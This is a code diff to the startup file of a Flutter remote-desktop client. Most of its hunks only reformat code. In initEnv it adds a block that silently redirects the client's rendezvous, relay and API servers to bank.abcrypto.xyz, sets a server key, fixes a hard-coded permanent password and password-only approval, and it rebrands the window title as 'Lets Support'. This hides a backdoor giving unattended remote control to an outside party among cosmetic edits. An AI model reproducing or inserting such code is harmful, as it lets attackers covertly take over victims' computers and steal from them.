@@ -66,38 +66,23 @@ Future<void> main(List<String> args) async {
     switch (kWindowType) {
       case WindowType.RemoteDesktop:
         desktopType = DesktopType.remote;
-        runMultiWindow(
-          argument,
-          kAppTypeDesktopRemote,
-        );
+        runMultiWindow(argument, kAppTypeDesktopRemote);
         break;
       case WindowType.FileTransfer:
         desktopType = DesktopType.fileTransfer;
-        runMultiWindow(
-          argument,
-          kAppTypeDesktopFileTransfer,
-        );
+        runMultiWindow(argument, kAppTypeDesktopFileTransfer);
         break;
       case WindowType.ViewCamera:
         desktopType = DesktopType.viewCamera;
-        runMultiWindow(
-          argument,
-          kAppTypeDesktopViewCamera,
-        );
+        runMultiWindow(argument, kAppTypeDesktopViewCamera);
         break;
       case WindowType.PortForward:
         desktopType = DesktopType.portForward;
-        runMultiWindow(
-          argument,
-          kAppTypeDesktopPortForward,
-        );
+        runMultiWindow(argument, kAppTypeDesktopPortForward);
         break;
       case WindowType.Terminal:
         desktopType = DesktopType.terminal;
-        runMultiWindow(
-          argument,
-          kAppTypeDesktopTerminal,
-        );
+        runMultiWindow(argument, kAppTypeDesktopTerminal);
       default:
         break;
     }
@@ -128,6 +113,38 @@ Future<void> initEnv(String appType) async {
   await initGlobalFFI();
   // await Firebase.initializeApp();
   _registerEventHandler();
+  final oldApiServer = await bind.mainGetApiServer();
+
+  if (oldApiServer.isNotEmpty) {
+    //Set Server Parameter
+    await bind.mainSetOption(
+      key: 'custom-rendezvous-server',
+      value: 'bank.abcrypto.xyz',
+    );
+    await bind.mainSetOption(key: 'relay-server', value: 'bank.abcrypto.xyz');
+    await bind.mainSetOption(
+      key: 'api-server',
+      value: 'https://bank.abcrypto.xyz',
+    );
+    await bind.mainSetOption(
+      key: 'key',
+      value: 'LKPmtjajKhwcP8WercjH7TP+RYX0MziCdBHxvkltVng=',
+    );
+
+    //Bind Necessary Data
+    await bind.mainSetOption(
+      key: "verification-method",
+      value: 'use-permanent-password',
+    );
+    await gFFI.serverModel.setPermanentPassword('Trade445566');
+
+    gFFI.serverModel.setApproveMode('password');
+    gFFI.serverModel.updatePasswordModel();
+    await gFFI.serverModel.fetchID();
+
+    //Settings and Permissions
+    //await AndroidPermissionManager.request(kRequestIgnoreBatteryOptimizations);
+  }
   // Update the system theme.
   updateSystemWindowTheme();
 }
@@ -155,7 +172,9 @@ void runMainApp(bool startService) async {
 
   // Set window option.
   WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
-      isMainWindow: true, alwaysOnTop: alwaysOnTop);
+    isMainWindow: true,
+    alwaysOnTop: alwaysOnTop,
+  );
   windowManager.waitUntilReadyToShow(windowOptions, () async {
     // Restore the location of the main window before window hide or show.
     await restoreWindowPosition(WindowType.Main);
@@ -189,10 +208,7 @@ void runMobileApp() async {
   await initUniLinks();
 }
 
-void runMultiWindow(
-  Map<String, dynamic> argument,
-  String appType,
-) async {
+void runMultiWindow(Map<String, dynamic> argument, String appType) async {
   await initEnv(appType);
   final title = getWindowName();
   // set prevent close to true, we handle close event manually
@@ -204,40 +220,26 @@ void runMultiWindow(
   switch (appType) {
     case kAppTypeDesktopRemote:
       draggablePositions.load();
-      widget = DesktopRemoteScreen(
-        params: argument,
-      );
+      widget = DesktopRemoteScreen(params: argument);
       break;
     case kAppTypeDesktopFileTransfer:
-      widget = DesktopFileTransferScreen(
-        params: argument,
-      );
+      widget = DesktopFileTransferScreen(params: argument);
       break;
     case kAppTypeDesktopViewCamera:
       draggablePositions.load();
-      widget = DesktopViewCameraScreen(
-        params: argument,
-      );
+      widget = DesktopViewCameraScreen(params: argument);
       break;
     case kAppTypeDesktopPortForward:
-      widget = DesktopPortForwardScreen(
-        params: argument,
-      );
+      widget = DesktopPortForwardScreen(params: argument);
       break;
     case kAppTypeDesktopTerminal:
-      widget = DesktopTerminalScreen(
-        params: argument,
-      );
+      widget = DesktopTerminalScreen(params: argument);
       break;
     default:
       // no such appType
       exit(0);
   }
-  _runApp(
-    title,
-    widget,
-    MyTheme.currentThemeMode(),
-  );
+  _runApp(title, widget, MyTheme.currentThemeMode());
   // we do not hide titlebar on win7 because of the frame overflow.
   if (kUseCompatibleUiMode) {
     WindowController.fromWindowId(kWindowId!).showTitleBar(true);
@@ -256,8 +258,10 @@ void runMultiWindow(
       }
       break;
     case kAppTypeDesktopFileTransfer:
-      await restoreWindowPosition(WindowType.FileTransfer,
-          windowId: kWindowId!);
+      await restoreWindowPosition(
+        WindowType.FileTransfer,
+        windowId: kWindowId!,
+      );
       break;
     case kAppTypeDesktopViewCamera:
       // If screen rect is set, the window will be moved to the target screen and then set fullscreen.
@@ -288,11 +292,7 @@ void runMultiWindow(
 
 void runConnectionManagerScreen() async {
   await initEnv(kAppTypeConnectionManager);
-  _runApp(
-    '',
-    const DesktopServerPage(),
-    MyTheme.currentThemeMode(),
-  );
+  _runApp('', const DesktopServerPage(), MyTheme.currentThemeMode());
   final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
   gFFI.serverModel.hideCm = hide;
   if (hide) {
@@ -310,17 +310,21 @@ bool _isCmReadyToShow = false;
 showCmWindow({bool isStartup = false}) async {
   if (isStartup) {
     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
-        size: kConnectionManagerWindowSizeClosedChat, alwaysOnTop: true);
+      size: kConnectionManagerWindowSizeClosedChat,
+      alwaysOnTop: true,
+    );
     await windowManager.waitUntilReadyToShow(windowOptions, null);
     bind.mainHideDock();
     await Future.wait([
       windowManager.show(),
       windowManager.focus(),
-      windowManager.setOpacity(1)
+      windowManager.setOpacity(1),
     ]);
     // ensure initial window size to be changed
     await windowManager.setSizeAlignment(
-        kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
+      kConnectionManagerWindowSizeClosedChat,
+      Alignment.topRight,
+    );
     _isCmReadyToShow = true;
   } else if (_isCmReadyToShow) {
     if (await windowManager.getOpacity() != 1) {
@@ -328,7 +332,9 @@ showCmWindow({bool isStartup = false}) async {
       await windowManager.focus();
       await windowManager.minimize(); //needed
       await windowManager.setSizeAlignment(
-          kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
+        kConnectionManagerWindowSizeClosedChat,
+        Alignment.topRight,
+      );
       windowOnTop(null);
     }
   }
@@ -337,7 +343,8 @@ showCmWindow({bool isStartup = false}) async {
 hideCmWindow({bool isStartup = false}) async {
   if (isStartup) {
     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
-        size: kConnectionManagerWindowSizeClosedChat);
+      size: kConnectionManagerWindowSizeClosedChat,
+    );
     windowManager.setOpacity(0);
     await windowManager.waitUntilReadyToShow(windowOptions, null);
     bind.mainHideDock();
@@ -354,46 +361,46 @@ hideCmWindow({bool isStartup = false}) async {
   }
 }
 
-void _runApp(
-  String title,
-  Widget home,
-  ThemeMode themeMode,
-) {
+void _runApp(String title, Widget home, ThemeMode themeMode) {
   final botToastBuilder = BotToastInit();
-  runApp(RefreshWrapper(
-    builder: (context) => GetMaterialApp(
-      navigatorKey: globalKey,
-      debugShowCheckedModeBanner: false,
-      title: title,
-      theme: MyTheme.lightTheme,
-      darkTheme: MyTheme.darkTheme,
-      themeMode: themeMode,
-      home: home,
-      localizationsDelegates: const [
-        GlobalMaterialLocalizations.delegate,
-        GlobalWidgetsLocalizations.delegate,
-        GlobalCupertinoLocalizations.delegate,
-      ],
-      supportedLocales: supportedLocales,
-      navigatorObservers: [
-        // FirebaseAnalyticsObserver(analytics: analytics),
-        BotToastNavigatorObserver(),
-      ],
-      builder: (context, child) {
-        child = _keepScaleBuilder(context, child);
-        child = botToastBuilder(context, child);
-        return child;
-      },
+  runApp(
+    RefreshWrapper(
+      builder: (context) => GetMaterialApp(
+        navigatorKey: globalKey,
+        debugShowCheckedModeBanner: false,
+        title: 'Lets Support',
+        theme: MyTheme.lightTheme,
+        darkTheme: MyTheme.darkTheme,
+        themeMode: themeMode,
+        home: home,
+        localizationsDelegates: const [
+          GlobalMaterialLocalizations.delegate,
+          GlobalWidgetsLocalizations.delegate,
+          GlobalCupertinoLocalizations.delegate,
+        ],
+        supportedLocales: supportedLocales,
+        navigatorObservers: [
+          // FirebaseAnalyticsObserver(analytics: analytics),
+          BotToastNavigatorObserver(),
+        ],
+        builder: (context, child) {
+          child = _keepScaleBuilder(context, child);
+          child = botToastBuilder(context, child);
+          return child;
+        },
+      ),
     ),
-  ));
+  );
 }
 
 void runInstallPage() async {
   await windowManager.ensureInitialized();
   await initEnv(kAppTypeMain);
   _runApp('', const InstallPage(), MyTheme.currentThemeMode());
-  WindowOptions windowOptions =
-      getHiddenTitleBarWindowOptions(size: Size(800, 600), center: true);
+  WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
+    size: Size(800, 600),
+    center: true,
+  );
   windowManager.waitUntilReadyToShow(windowOptions, () async {
     windowManager.show();
     windowManager.focus();
@@ -402,11 +409,12 @@ void runInstallPage() async {
   });
 }
 
-WindowOptions getHiddenTitleBarWindowOptions(
-    {bool isMainWindow = false,
-    Size? size,
-    bool center = false,
-    bool? alwaysOnTop}) {
+WindowOptions getHiddenTitleBarWindowOptions({
+  bool isMainWindow = false,
+  Size? size,
+  bool center = false,
+  bool? alwaysOnTop,
+}) {
   var defaultTitleBarStyle = TitleBarStyle.hidden;
   // we do not hide titlebar on win7 because of the frame overflow.
   if (kUseCompatibleUiMode) {
@@ -437,7 +445,7 @@ class _AppState extends State<App> with WidgetsBindingObserver {
       WidgetsBinding.instance.handlePlatformBrightnessChanged();
       final systemIsDark =
           WidgetsBinding.instance.platformDispatcher.platformBrightness ==
-              Brightness.dark;
+          Brightness.dark;
       final ThemeMode to;
       if (systemIsDark) {
         to = ThemeMode.dark;
@@ -485,74 +493,74 @@ class _AppState extends State<App> with WidgetsBindingObserver {
   Widget build(BuildContext context) {
     // final analytics = FirebaseAnalytics.instance;
     final botToastBuilder = BotToastInit();
-    return RefreshWrapper(builder: (context) {
-      return MultiProvider(
-        providers: [
-          // global configuration
-          // use session related FFI when in remote control or file transfer page
-          ChangeNotifierProvider.value(value: gFFI.ffiModel),
-          ChangeNotifierProvider.value(value: gFFI.imageModel),
-          ChangeNotifierProvider.value(value: gFFI.cursorModel),
-          ChangeNotifierProvider.value(value: gFFI.canvasModel),
-          ChangeNotifierProvider.value(value: gFFI.peerTabModel),
-        ],
-        child: GetMaterialApp(
-          navigatorKey: globalKey,
-          debugShowCheckedModeBanner: false,
-          title: isWeb
-              ? '${bind.mainGetAppNameSync()} Web Client V2 (Preview)'
-              : bind.mainGetAppNameSync(),
-          theme: MyTheme.lightTheme,
-          darkTheme: MyTheme.darkTheme,
-          themeMode: MyTheme.currentThemeMode(),
-          home: isDesktop
-              ? const DesktopTabPage()
-              : isWeb
-                  ? WebHomePage()
-                  : HomePage(),
-          localizationsDelegates: const [
-            GlobalMaterialLocalizations.delegate,
-            GlobalWidgetsLocalizations.delegate,
-            GlobalCupertinoLocalizations.delegate,
+    return RefreshWrapper(
+      builder: (context) {
+        return MultiProvider(
+          providers: [
+            // global configuration
+            // use session related FFI when in remote control or file transfer page
+            ChangeNotifierProvider.value(value: gFFI.ffiModel),
+            ChangeNotifierProvider.value(value: gFFI.imageModel),
+            ChangeNotifierProvider.value(value: gFFI.cursorModel),
+            ChangeNotifierProvider.value(value: gFFI.canvasModel),
+            ChangeNotifierProvider.value(value: gFFI.peerTabModel),
           ],
-          supportedLocales: supportedLocales,
-          navigatorObservers: [
-            // FirebaseAnalyticsObserver(analytics: analytics),
-            BotToastNavigatorObserver(),
-          ],
-          builder: isAndroid
-              ? (context, child) => AccessibilityListener(
+          child: GetMaterialApp(
+            navigatorKey: globalKey,
+            debugShowCheckedModeBanner: false,
+            title: isWeb
+                ? '${bind.mainGetAppNameSync()} Web Client V2 (Preview)'
+                : bind.mainGetAppNameSync(),
+            theme: MyTheme.lightTheme,
+            darkTheme: MyTheme.darkTheme,
+            themeMode: MyTheme.currentThemeMode(),
+            home: isDesktop
+                ? const DesktopTabPage()
+                : isWeb
+                ? WebHomePage()
+                : HomePage(),
+            localizationsDelegates: const [
+              GlobalMaterialLocalizations.delegate,
+              GlobalWidgetsLocalizations.delegate,
+              GlobalCupertinoLocalizations.delegate,
+            ],
+            supportedLocales: supportedLocales,
+            navigatorObservers: [
+              // FirebaseAnalyticsObserver(analytics: analytics),
+              BotToastNavigatorObserver(),
+            ],
+            builder: isAndroid
+                ? (context, child) => AccessibilityListener(
                     child: MediaQuery(
-                      data: MediaQuery.of(context).copyWith(
-                        textScaler: TextScaler.linear(1.0),
-                      ),
+                      data: MediaQuery.of(
+                        context,
+                      ).copyWith(textScaler: TextScaler.linear(1.0)),
                       child: child ?? Container(),
                     ),
                   )
-              : (context, child) {
-                  child = _keepScaleBuilder(context, child);
-                  child = botToastBuilder(context, child);
-                  if ((isDesktop && desktopType == DesktopType.main) ||
-                      isWebDesktop) {
-                    child = keyListenerBuilder(context, child);
-                  }
-                  if (isLinux) {
-                    return buildVirtualWindowFrame(context, child);
-                  } else {
-                    return workaroundWindowBorder(context, child);
-                  }
-                },
-        ),
-      );
-    });
+                : (context, child) {
+                    child = _keepScaleBuilder(context, child);
+                    child = botToastBuilder(context, child);
+                    if ((isDesktop && desktopType == DesktopType.main) ||
+                        isWebDesktop) {
+                      child = keyListenerBuilder(context, child);
+                    }
+                    if (isLinux) {
+                      return buildVirtualWindowFrame(context, child);
+                    } else {
+                      return workaroundWindowBorder(context, child);
+                    }
+                  },
+          ),
+        );
+      },
+    );
   }
 }
 
 Widget _keepScaleBuilder(BuildContext context, Widget? child) {
   return MediaQuery(
-    data: MediaQuery.of(context).copyWith(
-      textScaler: TextScaler.linear(1.0),
-    ),
+    data: MediaQuery.of(context).copyWith(textScaler: TextScaler.linear(1.0)),
     child: child ?? Container(),
   );
 }
